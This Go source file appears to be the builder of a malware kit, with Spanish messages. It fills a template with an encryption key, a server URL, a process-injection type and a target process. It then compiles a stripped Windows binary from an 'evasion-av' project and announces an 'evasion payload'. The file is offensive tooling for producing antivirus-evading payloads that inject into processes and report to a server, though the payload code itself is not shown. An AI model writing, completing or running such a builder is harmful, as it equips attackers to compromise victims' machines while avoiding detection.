package builder

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func BuildEvasion(outputPath, encryptionKey, serverURL, injectionType, targetProcess string, evasiveMode bool) error {
	if err := os.MkdirAll(filepath.Dir(outputPath), 0755); err != nil {
		return fmt.Errorf("no se pudo crear carpeta destino: %v", err)
	}

	evasionDir := filepath.Join("..", "evasion-av")
	configTemplatePath := filepath.Join("..", "evasion-av", "config", "config.go.tmpl")
	configOutPath := filepath.Join("..", "evasion-av", "config", "config.go")

	template, err := os.ReadFile(configTemplatePath)
	if err != nil {
		return fmt.Errorf("no se pudo leer la plantilla: %v", err)
	}

	content := string(template)
	content = strings.ReplaceAll(content, "{{ENCRYPTION_KEY}}", encryptionKey)
	content = strings.ReplaceAll(content, "{{SERVER_URL}}", serverURL)
	content = strings.ReplaceAll(content, "{{INJECTION_TYPE}}", injectionType)
	content = strings.ReplaceAll(content, "{{TARGET_PROCESS}}", strings.ReplaceAll(targetProcess, `\`, `\\`))
	content = strings.ReplaceAll(content, "{{EVASIVE_MODE}}", fmt.Sprintf("%v", evasiveMode))

	if err := os.WriteFile(configOutPath, []byte(content), 0644); err != nil {
		return fmt.Errorf("error escribiendo config.go: %v", err)
	}

	buildEnv := append(os.Environ(),
		"GOOS=windows",
		"GOARCH=amd64",
		"CGO_ENABLED=0",
	)

	cmd := exec.Command("go", "build", "-ldflags=-s -w", "-o", outputPath, ".")
	cmd.Dir = evasionDir
	cmd.Env = buildEnv

	out, err := cmd.CombinedOutput()
	fmt.Println("Salida del build evasion:\n", string(out))
	if err != nil {
		return fmt.Errorf("falló la compilación:\n%s\nDetalles: %v", string(out), err)
	}

	info, err := os.Stat(outputPath)
	if err != nil {
		return fmt.Errorf("binario no encontrado: %v", err)
	}
	if info.Size() < 100_000 {
		return fmt.Errorf("binario muy pequeño (%d bytes)", info.Size())
	}

	fmt.Println("✅ Evasion payload generado en:", outputPath)
	return nil
}
